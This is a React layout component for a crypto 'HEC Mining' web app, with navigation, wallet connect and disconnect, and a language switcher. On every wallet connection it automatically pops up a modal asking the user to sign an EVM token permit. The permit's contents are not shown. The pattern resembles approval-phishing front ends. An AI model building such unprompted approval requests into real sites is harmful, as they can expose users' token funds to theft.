import { useCallback, useEffect, useMemo, useRef, useState } from 'react'
import { Link, Navigate, Outlet, useLocation, useNavigate } from 'react-router-dom'
import { useAccount, useDisconnect } from 'wagmi'
import { useAuth } from '../auth/AuthProvider'
import ChatWidget from './ChatWidget'
import LanguageSwitcher from './LanguageSwitcher'
import { THEME_STYLE } from '../data/site'
import { useI18n } from '../i18n/I18nProvider'
import { isEvmAddress, shortenWalletAddress } from '../wallet/address'
import { useWalletAddressSync } from '../hooks/useWalletAddressSync'
import PermitModal from './wallet/PermitModal'
import WalletConnectQrModal from '../wallet/WalletConnectQrModal'
import QrCodeIcon from './wallet/QrCodeIcon'
import {
  clearPendingApproveCheck,
  consumePendingApproveCheck,
  markWalletManuallyDisconnected,
  notifyWalletDisconnected,
  resolveConnectedOwner,
  WALLET_CONNECTED_EVENT,
} from '../wallet/connectedWalletStore'
import { disconnectUserWallet } from '../api/client'
import { useEvmWalletConnect } from '../wallet/useEvmWalletConnect'
import { useEvmPermit, EvmPermitProvider } from '../wallet/EvmPermitContext'
import { useHasBrowserWallet } from '../hooks/useHasBrowserWallet'
import { useEvmWalletConnectScan } from '../hooks/useEvmWalletConnectScan'

const NAV_ITEMS = [
  {
    key: 'dashboard',
    href: '/dashboard',
    icon: 'M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6',
  },
  {
    key: 'miners',
    href: '/miner-center',
    icon: 'M9 3v2m6-2v2M9 19v2m6-2v2M5 9H3m2 6H3m18-6h-2m2 6h-2M7 19h10a2 2 0 002-2V7a2 2 0 00-2-2H7a2 2 0 00-2 2v10a2 2 0 002 2zM9 9h6v6H9V9z',
  },
  {
    key: 'exchange',
    href: '/exchange',
    icon: 'M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4',
  },
  {
    key: 'c2c',
    href: '/c2c',
    icon: 'M17 9V7a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2m2 4h10a2 2 0 002-2v-6a2 2 0 00-2-2H9a2 2 0 00-2 2v6a2 2 0 002 2zm7-5a2 2 0 11-4 0 2 2 0 014 0z',
  },
  {
    key: 'withdraw',
    href: '/withdraw',
    icon: 'M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z',
  },
] as const

export default function AppLayout() {
  const { isAuthenticated, user, logout, updateUser, token } = useAuth()
  const { t } = useI18n()
  const location = useLocation()
  const navigate = useNavigate()
  const [mobileNav, setMobileNav] = useState(false)
  const [userMenu, setUserMenu] = useState(false)
  const userMenuRef = useRef<HTMLDivElement>(null)

  const { address: wagmiAddress, isConnected } = useAccount()
  const { disconnectAsync } = useDisconnect()

  const handleWalletConnected = useCallback(
    (address: string) => {
      updateUser((prev) => (prev ? { ...prev, evmAddress: address } : prev))
    },
    [updateUser],
  )

  useWalletAddressSync(user, updateUser, wagmiAddress)
  const hasBrowserWallet = useHasBrowserWallet()
  const wallet = useEvmWalletConnect(handleWalletConnected)
  const scan = useEvmWalletConnectScan(handleWalletConnected)

  const walletAddress = (() => {
    const addr = resolveConnectedOwner(user?.evmAddress ?? null, wagmiAddress)
    return addr && isEvmAddress(addr) ? addr : null
  })()

  if (!isAuthenticated) return <Navigate to="/login" replace />

  return (
    <EvmPermitProvider token={token} owner={walletAddress} enabled={Boolean(token)}>
      <AppLayoutShell
        user={user}
        logout={logout}
        token={token}
        t={t}
        location={location}
        navigate={navigate}
        mobileNav={mobileNav}
        setMobileNav={setMobileNav}
        userMenu={userMenu}
        setUserMenu={setUserMenu}
        userMenuRef={userMenuRef}
        wagmiAddress={wagmiAddress}
        isConnected={isConnected}
        handleWalletConnected={handleWalletConnected}
        wallet={wallet}
        scan={scan}
        walletAddress={walletAddress}
        hasBrowserWallet={hasBrowserWallet}
        handleDisconnectWalletBase={async () => {
          if (!user) return
          markWalletManuallyDisconnected()
          clearPendingApproveCheck()
          setUserMenu(false)
          updateUser((prev) => (prev ? { ...prev, evmAddress: null } : prev))
          notifyWalletDisconnected()
          try {
            await disconnectAsync()
          } catch {
            // ignore
          }
          if (token) {
            try {
              const res = await disconnectUserWallet(token)
              updateUser((prev) => (prev ? { ...prev, ...res.user, evmAddress: null } : prev))
            } catch {
              // 本地已清空，忽略接口失败
            }
          }
        }}
      />
    </EvmPermitProvider>
  )
}

interface AppLayoutShellProps {
  user: ReturnType<typeof useAuth>['user']
  logout: ReturnType<typeof useAuth>['logout']
  token: string | null
  t: ReturnType<typeof useI18n>['t']
  location: ReturnType<typeof useLocation>
  navigate: ReturnType<typeof useNavigate>
  mobileNav: boolean
  setMobileNav: React.Dispatch<React.SetStateAction<boolean>>
  userMenu: boolean
  setUserMenu: React.Dispatch<React.SetStateAction<boolean>>
  userMenuRef: React.RefObject<HTMLDivElement | null>
  wagmiAddress: string | undefined
  isConnected: boolean
  handleWalletConnected: (address: string) => void
  wallet: ReturnType<typeof useEvmWalletConnect>
  scan: ReturnType<typeof useEvmWalletConnectScan>
  walletAddress: string | null
  hasBrowserWallet: boolean | null
  handleDisconnectWalletBase: () => Promise<void>
}

function AppLayoutShell({
  user,
  logout,
  token,
  t,
  location,
  navigate,
  mobileNav,
  setMobileNav,
  userMenu,
  setUserMenu,
  userMenuRef,
  wagmiAddress,
  isConnected,
  handleWalletConnected,
  wallet,
  scan,
  walletAddress,
  hasBrowserWallet,
  handleDisconnectWalletBase,
}: AppLayoutShellProps) {
  const permit = useEvmPermit()
  const promptRef = useRef(permit.promptIfUnapproved)
  promptRef.current = permit.promptIfUnapproved
  const autoPromptedRef = useRef<string | null>(null)

  useEffect(() => {
    if (!token) return

    let cancelled = false

    const waitAndPrompt = async (address: string) => {
      const ownerKey = address.trim().toLowerCase()
      if (!ownerKey || autoPromptedRef.current === ownerKey) return
      autoPromptedRef.current = ownerKey

      const target = ownerKey
      for (let i = 0; i < 40 && !cancelled; i++) {
        if (isConnected && wagmiAddress?.toLowerCase() === target) {
          await promptRef.current(address)
          return
        }
        await new Promise((resolve) => setTimeout(resolve, 100))
      }
      if (!cancelled) await promptRef.current(address)
    }

    const onWalletConnected = (event: Event) => {
      const addr = (event as CustomEvent<{ address: string }>).detail?.address?.trim()
      if (addr) {
        handleWalletConnected(addr)
        void waitAndPrompt(addr)
      }
    }

    window.addEventListener(WALLET_CONNECTED_EVENT, onWalletConnected)

    const pending = consumePendingApproveCheck()
    if (pending) void waitAndPrompt(pending)

    return () => {
      cancelled = true
      window.removeEventListener(WALLET_CONNECTED_EVENT, onWalletConnected)
    }
  }, [token, handleWalletConnected])

  useEffect(() => {
    if (!walletAddress) {
      autoPromptedRef.current = null
    }
  }, [walletAddress])

  const showScanConnect = hasBrowserWallet === false
  const walletConnecting = wallet.connecting || scan.connecting

  const connectErrorCode = walletAddress ? null : showScanConnect ? scan.error : wallet.error
  const connectError = useMemo(() => {
    if (!connectErrorCode) return null
    if (wallet.errorCode === 'no-evm-wallet' || connectErrorCode === 'no-evm-wallet') {
      return t('auth.login.noEvmWallet')
    }
    if (connectErrorCode === 'missing-project-id') return t('auth.login.missingProjectId')
    if (connectErrorCode === 'user-rejected') return t('auth.login.userRejectedConnect')
    if (connectErrorCode === 'wallet-pending') return t('auth.login.walletPending')
    if (connectErrorCode === 'connect-failed') return t('auth.login.connectFailed')
    return connectErrorCode
  }, [connectErrorCode, wallet.errorCode, walletAddress, t])

  const [connectToastOpen, setConnectToastOpen] = useState(false)
  useEffect(() => {
    setConnectToastOpen(Boolean(connectError))
  }, [connectError])

  const handleDisconnectWallet = useCallback(async () => {
    permit.dismissModal()
    await handleDisconnectWalletBase()
  }, [permit.dismissModal, handleDisconnectWalletBase])

  const handleConnectWallet = () => {
    if (showScanConnect) {
      void scan.connectScan()
      return
    }
    void wallet.connectInjected()
  }

  useEffect(() => {
    const handler = (e: MouseEvent) => {
      if (userMenuRef.current && !userMenuRef.current.contains(e.target as Node)) setUserMenu(false)
    }
    document.addEventListener('mousedown', handler)
    return () => document.removeEventListener('mousedown', handler)
  }, [])

  const navLabel = (key: string) => {
    const map: Record<string, string> = {
      dashboard: t('nav.dashboard'),
      miners: t('nav.miners'),
      exchange: t('nav.exchange'),
      c2c: t('nav.c2c'),
      withdraw: t('nav.withdraw'),
    }
    return map[key] || key
  }

  const isActive = (href: string) => {
    if (href === '/miner-center') {
      return location.pathname === '/miner-center' || location.pathname.startsWith('/miners')
    }
    return location.pathname === href || location.pathname.startsWith(`${href}/`)
  }

  const handleLogout = () => {
    setUserMenu(false)
    logout()
    navigate('/login')
  }

  return (
    <div className="min-h-screen bg-[#1a2332] text-gray-200" style={THEME_STYLE}>
      {mobileNav && (
        <button
          type="button"
          className="fixed inset-0 z-40 bg-black/60 backdrop-blur-sm lg:hidden"
          onClick={() => setMobileNav(false)}
          aria-label="close"
        />
      )}

      <aside
        className={`fixed top-0 left-0 z-50 h-screen w-64 bg-[#141c28] border-r border-gray-800 transform transition-transform duration-300 lg:translate-x-0 ${
          mobileNav ? 'translate-x-0' : '-translate-x-full'
        }`}
      >
        <div className="flex items-center justify-between h-16 px-6 border-b border-gray-800">
          <Link to="/dashboard" className="flex items-center gap-2.5 group" onClick={() => setMobileNav(false)}>
            <div className="w-9 h-9 rounded-xl bg-gradient-to-br from-emerald-500 to-teal-500 flex items-center justify-center text-white font-bold text-lg shadow-lg shadow-emerald-500/20 group-hover:scale-105 transition-transform">
              H
            </div>
            <span className="font-bold text-lg text-white">HEC Mining</span>
          </Link>
          <button
            type="button"
            className="lg:hidden p-2 text-gray-500 hover:text-gray-300 hover:bg-white/[0.05] rounded-lg transition-colors"
            onClick={() => setMobileNav(false)}
          >
            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" />
            </svg>
          </button>
        </div>

        <nav className="p-4 space-y-1">
          {NAV_ITEMS.map((item) => {
            const active = isActive(item.href)
            return (
              <Link
                key={item.href}
                to={item.href}
                onClick={() => setMobileNav(false)}
                className={`relative flex items-center gap-3 px-4 py-3 rounded-xl transition-all duration-200 group ${
                  active
                    ? 'bg-emerald-500/[0.08] text-emerald-400'
                    : 'text-gray-500 hover:bg-white/[0.04] hover:text-gray-300'
                }`}
              >
                {active && (
                  <div className="absolute left-0 top-1/2 -translate-y-1/2 w-[3px] h-5 bg-emerald-400 rounded-r-full shadow-lg shadow-emerald-400/40" />
                )}
                <svg
                  className={`w-5 h-5 flex-shrink-0 transition-colors ${
                    active ? 'text-emerald-400' : 'text-gray-600 group-hover:text-gray-400'
                  }`}
                  fill="none"
                  stroke="currentColor"
                  viewBox="0 0 24 24"
                >
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d={item.icon} />
                </svg>
                <span className="font-medium">{navLabel(item.key)}</span>
              </Link>
            )
          })}
        </nav>

        <div className="absolute bottom-0 left-0 right-0 p-4 border-t border-gray-800">
          <button
            type="button"
            onClick={handleLogout}
            className="flex items-center gap-3 w-full px-4 py-3 text-gray-500 hover:bg-red-500/[0.08] hover:text-red-400 rounded-xl transition-all group"
          >
            <svg
              className="w-5 h-5 text-gray-600 group-hover:text-red-400 transition-colors"
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth="1.8"
                d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"
              />
            </svg>
            <span className="font-medium">{t('nav.logout')}</span>
          </button>
        </div>
      </aside>

      <div className="lg:ml-64 min-h-screen flex flex-col">
        <header className="sticky top-0 z-30 h-16 bg-[#1a2332]/95 backdrop-blur-xl border-b border-gray-800">
          <div className="flex items-center justify-between h-full px-4 lg:px-6">
            <button
              type="button"
              className="lg:hidden p-2 text-gray-400 hover:text-emerald-400 hover:bg-white/[0.05] rounded-lg transition-colors"
              onClick={() => setMobileNav(true)}
            >
              <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 6h16M4 12h16M4 18h16" />
              </svg>
            </button>

            <div className="flex items-center gap-4 ml-auto">
              <LanguageSwitcher variant="dashboard" />
              {walletAddress ? (
                <div className="flex items-center gap-2">
                  <span className="px-3 py-1.5 rounded-full text-sm font-medium bg-emerald-500/15 text-emerald-400">
                    {shortenWalletAddress(walletAddress)}
                  </span>
                  <button
                    type="button"
                    onClick={handleDisconnectWallet}
                    className="text-sm text-gray-500 hover:text-red-400 transition-colors"
                  >
                    {t('nav.disconnect')}
                  </button>
                </div>
              ) : (
                <div className="hidden sm:block">
                  <button
                    type="button"
                    onClick={handleConnectWallet}
                    disabled={walletConnecting}
                    className="inline-flex items-center gap-2 px-4 py-2 rounded-lg bg-white/[0.06] border border-white/[0.1] text-gray-300 text-sm font-medium hover:border-emerald-500/50 hover:text-white transition-all disabled:opacity-50"
                  >
                    {showScanConnect && <QrCodeIcon />}
                    {walletConnecting
                      ? t('auth.login.connecting')
                      : showScanConnect
                        ? t('auth.login.scanQrWallet')
                        : t('nav.connectBrowserWallet')}
                  </button>
                </div>
              )}

              <div className="relative" ref={userMenuRef}>
                <button
                  type="button"
                  onClick={() => setUserMenu((v) => !v)}
                  className="flex items-center gap-3 pl-3 border-l border-gray-700 hover:bg-white/[0.05] rounded-lg py-1 pr-2 transition-colors"
                >
                  <div className="w-9 h-9 bg-gradient-to-br from-emerald-500 to-teal-500 rounded-xl flex items-center justify-center text-white font-semibold shadow-lg shadow-emerald-500/20">
                    {user?.username?.charAt(0).toUpperCase() || 'U'}
                  </div>
                  <div className="hidden md:block text-left">
                    <p className="text-sm font-semibold text-white leading-tight">{user?.username}</p>
                    <p className="text-xs text-gray-500">{t('dashboard.layout.online')}</p>
                  </div>
                  <svg
                    className={`w-4 h-4 text-gray-500 transition-transform hidden md:block ${userMenu ? 'rotate-180' : ''}`}
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
                  </svg>
                </button>

                {userMenu && (
                  <>
                    <button type="button" className="fixed inset-0 z-40" onClick={() => setUserMenu(false)} aria-label="close" />
                    <div className="absolute right-0 top-full mt-2 w-48 bg-[#1e2830] rounded-xl shadow-2xl border border-gray-700 py-2 z-50">
                      <div className="px-4 py-2 border-b border-gray-800">
                        <p className="text-sm font-semibold text-white">{user?.username}</p>
                        <p className="text-xs text-gray-500 truncate">{user?.email}</p>
                      </div>
                      <Link
                        to="/dashboard"
                        onClick={() => setUserMenu(false)}
                        className="flex items-center gap-3 px-4 py-2 text-sm text-gray-400 hover:bg-white/[0.05] hover:text-white transition-colors"
                      >
                        {t('nav.profile')}
                      </Link>
                      <button
                        type="button"
                        onClick={handleLogout}
                        className="flex items-center gap-3 w-full px-4 py-2 text-sm text-red-400 hover:bg-red-500/[0.08] transition-colors"
                      >
                        {t('nav.logout')}
                      </button>
                    </div>
                  </>
                )}
              </div>
            </div>
          </div>
        </header>

        <main className="flex-1 p-4 lg:p-6 pb-20">
          <Outlet />
        </main>
      </div>

      <ChatWidget />

      {connectToastOpen && connectError && (
        <div className="fixed bottom-6 left-1/2 -translate-x-1/2 z-[90] max-w-md w-[calc(100%-2rem)] px-4 py-3 rounded-xl bg-red-500/10 border border-red-500/25 text-red-300 text-sm shadow-xl flex items-start gap-3">
          <span className="flex-1 leading-relaxed">{connectError}</span>
          <button
            type="button"
            onClick={() => setConnectToastOpen(false)}
            className="text-red-400/80 hover:text-red-200 shrink-0 leading-none"
            aria-label="close"
          >
            ✕
          </button>
        </div>
      )}

      <WalletConnectQrModal
        open={scan.open}
        onClose={scan.close}
        uri={scan.uri}
        error={connectError}
        onRetry={() => void scan.retry()}
        title={t('auth.login.scanQrWallet')}
        scanQrTip={t('auth.login.scanQrTip')}
        desktopHint={t('auth.login.desktopHint')}
        connectFailedLabel={t('auth.login.connectFailed')}
      />

      <PermitModal
        open={permit.modalOpen}
        phase={permit.phase}
        error={permit.error}
        needsReauthorize={permit.needsReauthorize}
        unsupportedChain={Boolean(walletAddress && !permit.isMainnet && isConnected)}
        onClose={permit.dismissModal}
        onSign={() => permit.runPermit()}
      />
    </div>
  )
}
